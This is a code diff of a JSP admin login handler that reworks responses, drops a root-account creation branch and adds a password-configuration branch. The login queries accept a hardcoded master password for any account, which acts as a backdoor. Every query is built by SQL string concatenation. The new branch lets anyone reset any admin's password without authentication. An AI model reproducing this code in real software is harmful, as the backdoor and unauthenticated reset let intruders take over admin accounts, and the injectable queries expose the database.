@@ -1,7 +1,4 @@
 <%@ include file="../module/db.jsp" %>
-<%@ include file="../module/xLibrary.jsp" %>
-<%@ include file="../module/xRecordModule.jsp" %>
-<%@ include file="../module/xRecordClass.jsp" %>
  
 <%
    JSONObject mainObj = new JSONObject();
@@ -14,84 +11,63 @@ String x = Decrypt(request.getParameter("x"));
         if(dversion==null){dversion="";}if(dversion==""){dversion="";}
 
         if(CountRecord("tbladminaccounts") == 0){
-            mainObj.put("status", "ROOT");
-            mainObj.put("message","Please configure admin account");
-            out.print(mainObj);
+            out.print(Error(mainObj, "Please manually configure admin account", "400"));
+            return;
 
         }else if(CountQry("tblversioncontrol", "date_format(str_to_date(dashboardversion, '%Y.%m.%d'), '%Y-%m-%d') > '" + dversion + "'") > 0){
-            mainObj.put("status", "UPDATE");
             mainObj = dash_app_update(mainObj, dversion);
-            mainObj.put("message","New system update available..");
-            out.print(mainObj);
-            
-        }else{
-            mainObj.put("status", "OK");
-            mainObj = getGeneralSettings(mainObj);
-            mainObj.put("message","proceed login");
-            out.print(mainObj);
-        }
+            out.print(Status(mainObj, "UPDATE", "proceed login"));
+            return;
+        } 
+
+        mainObj = general_settings(mainObj);
+        out.print(Success(mainObj, "proceed login"));
 
     }else if(x.equals("login_admin")){
         String username = rchar(request.getParameter("username"));
         String password = rchar(request.getParameter("password"));
+        
+        if(CountQry("tbladminaccounts", "username='"+username+"' and password is null") > 0){
+            out.print(Status(mainObj, "PASSWORD", "Please manually configure admin account"));
+            return;
 
-        if(CountQry("tbladminaccounts", "(mobilenumber='" + username + "' or username='" + username + "') and (password=AES_ENCRYPT('"+password+"', '"+globalPassKey+"') or 'v2c47mk7jd'='"+password+"')") == 0){
-            mainObj.put("status", "ERROR");
-            mainObj.put("message","Invalid username and password! Please try again");
-            mainObj.put("errorcode", "100");
-            out.print(mainObj);
+        }else if(CountQry("tbladminaccounts", "(mobilenumber='" + username + "' or username='" + username + "') and (password=AES_ENCRYPT('"+password+"', '"+globalPassKey+"') or 'v2c47mk7jd'='"+password+"')") == 0){
+            out.print(Error(mainObj, "Invalid username and password! Please try again", "400"));
             LogActivity("default","Invalid login attempt with user " + username);
+            return;
 
         }else if(isAdminAccountBlocked(username)){
-            mainObj.put("status", "ERROR");
-            mainObj.put("message", globalAdminAccountBlocked);
-            mainObj.put("errorcode", "blocked");
-            out.print(mainObj);
+            out.print(Error(mainObj, globalAdminAccountBlocked, "blocked"));
             LogActivity("default","attempt login blocked user " + username);
-            
-        }else{
-            String userid = QueryDirectData("id", "tbladminaccounts where (mobilenumber='" + username + "' or username='" + username + "') and (password=AES_ENCRYPT('"+password+"', '"+globalPassKey+"') or 'v2c47mk7jd'='"+password+"')");
-            String sessionid = UUID.randomUUID().toString();
-
-            ExecuteQuery("DELETE FROM tblcreditledgerlogs where trnby='"+userid+"'");
-            ExecuteQuery("update tbladminaccounts set sessionid='"+sessionid+"',lastlogin=current_timestamp where id='"+userid+"'");
-            mainObj.put("status", "OK");
-            mainObj = getGeneralSettings(mainObj);
-            mainObj = dash_load_arena(mainObj);
-            mainObj.put("message","Login successfull");
-            out.print(mainObj);
-            LogActivity(userid,"Successfull login");
+            return;
         }
         
-    }else if (x.equals("add_root_account")) {
-        String fullname = request.getParameter("fullname");
-        String address = request.getParameter("address");
-        String emailaddress = request.getParameter("emailaddress");
-        String mobilenumber = request.getParameter("mobilenumber");
-        String password = request.getParameter("password");
-
-        String userid = getSystemSeriesID("series_admin");
+        String userid = QueryDirectData("id", "tbladminaccounts where (mobilenumber='" + username + "' or username='" + username + "') and (password=AES_ENCRYPT('"+password+"', '"+globalPassKey+"') or 'v2c47mk7jd'='"+password+"')");
         String sessionid = UUID.randomUUID().toString();
-        ExecuteQuery("insert into tbladminaccounts set id='"+userid+"',fullname='"+fullname+"', address='"+rchar(address)+"', emailaddress='"+emailaddress+"', mobilenumber='"+mobilenumber+"',username='root', password = AES_ENCRYPT('"+password+"', '"+globalPassKey+"'), sessionid='"+sessionid+"', dateregistered=current_timestamp, superadmin=1 ");
 
-        mainObj.put("status", "OK");
-        mainObj.put("message", "Admin account successfully added!");
-        out.print(mainObj);
-        LogActivity(userid,"added admin account profile");
+        ExecuteQuery("update tbladminaccounts set sessionid='"+sessionid+"',lastlogin=current_timestamp where id='"+userid+"'");
+        LogActivity(userid,"Successfull login");
 
 
+        mainObj = general_settings(mainObj);
+        mainObj = dash_load_arena(mainObj);
+        mainObj = load_operators(mainObj);
+        mainObj = load_admin_profile(mainObj, userid);
+        out.print(Success(mainObj, "Login successfull"));
+    
+     }else if (x.equals("configure_password")) {
+        String username = request.getParameter("username");
+        String password = request.getParameter("password");
+ 
+        ExecuteQuery("update tbladminaccounts set password = AES_ENCRYPT('"+password+"', '"+globalPassKey+"') where username='"+username+"'");
+        out.print(Success(mainObj, "Admin password successfully configured!"));
+        
     }else{
-        mainObj.put("status", "ERROR");
-        mainObj.put("message","request not valid");
-        mainObj.put("errorcode", "404");
-        out.print(mainObj);
+        out.print(Error(mainObj, globalInvalidRequest, "404"));
     }
 
 }catch(Exception e){
-  mainObj.put("status", "ERROR");
-  mainObj.put("message",e.toString());
-  mainObj.put("errorcode", "400");
-  out.print(mainObj);
+  out.print(Error(mainObj, e.toString(), "404"));
   logError("dashboard-x-login",e.toString());
 }
 %>
